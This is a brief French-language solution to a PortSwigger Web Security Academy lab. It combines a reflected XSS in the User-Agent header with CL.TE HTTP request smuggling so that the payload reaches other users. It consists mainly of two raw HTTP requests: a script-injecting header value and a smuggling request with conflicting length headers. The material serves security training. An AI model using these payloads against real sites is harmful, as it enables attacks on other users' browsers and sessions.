# Lab

https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

## Solution

Dans la description du lab on nous dit qu'il y avait une XSS sur l'User-Agent.

En jouant cette requête, on proc bien une XSS :

```http
GET /post?postId=6 HTTP/2
Host: 0a6b003e038859ac821733e7005600ba.web-security-academy.net
Cookie: session=Q6jt5KuHjbZ7Tm1LkpmRUYleeOqmJa9i
User-Agent: a"/><script>alert(1)</script>
```

Maintenant il faut la smuggle car c'est une self-XSS.

Avec l'extension `HTTP Request Smuggler` on trouve une vulnérabilité HTTP Request Smuggling de type CL.TE.

```http
POST / HTTP/1.1
Host: 0a6b003e038859ac821733e7005600ba.web-security-academy.net
Cookie: session=Q6jt5KuHjbZ7Tm1LkpmRUYleeOqmJa9i
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 152

0


GET /post?postId=6 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```